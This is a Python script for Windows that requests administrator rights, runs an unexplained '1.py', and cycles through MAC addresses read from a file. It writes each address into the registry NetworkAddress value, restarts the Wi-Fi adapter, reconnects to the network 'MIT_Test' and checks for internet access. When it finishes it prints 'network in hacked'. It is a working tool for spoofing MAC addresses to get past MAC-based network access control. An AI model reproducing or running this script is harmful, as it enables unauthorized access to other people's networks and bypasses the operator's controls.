import subprocess
import time
import os
import sys
import ctypes

subprocess.run(["python", "1.py"])
# Function to check if ping is successful

def is_admin():
    """Check if the script is running with admin privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def run_as_admin():
    """Relaunch the script as administrator."""
    script = sys.argv[0]
    params = ' '.join(sys.argv[1:])
    # Use ctypes to request UAC elevation
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)

def ping(host):
    return subprocess.call(['ping', '-n', '1', host], stdout=subprocess.PIPE) == 0

# Function to read values from a text file
def read_values(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

# Function to connect to a Wi-Fi network
def connect_to_wifi(ssid):
    subprocess.call(['netsh', 'wlan', 'connect', 'name=', ssid])


if not is_admin():
        # If not running as admin, request permission
        run_as_admin()
        sys.exit()  # Exit the current non-admin instance
else:
        # Proceed with the script if it's already running as admin
        print("Running with administrator privileges.")
# Get the directory of the current script
script_dir = os.path.dirname(os.path.abspath(__file__))

# File containing list of values
values_file = os.path.join(script_dir, 'macd.txt')

# Read values from the file
values = read_values(values_file)
connect_to_wifi('MIT_Test')  
time.sleep(5) 
if not ping('amazon.com'):
    for value in values:
  
   
   
       
      # Command to change registry value
        # Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0003
        # string file with name NetworkAddress
       reg_command = f'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Class\\{{4d36e972-e325-11ce-bfc1-08002be10318}}\\0003" /v NetworkAddress /t REG_SZ /d "{value}" /f'
        # Execute registry command
       subprocess.call(reg_command, shell=True)
        # Disable and enable Wi-Fi interface
       subprocess.call('netsh interface set interface "Wi-Fi" disable', shell=True)
       subprocess.call('netsh interface set interface "Wi-Fi" enable', shell=True)
       print(f'changed to {value}')
       connect_to_wifi('MIT_Test')  
       time.sleep(5) 
       if ping('amazon.com'):
          print(f'Ping to amazon.com successful with value: {value}')
          break 
      
        
    else:
       print('All values tried but unable to ping amazon.com.')
print("network in hacked\n")
print("enter any key to exit")
input()
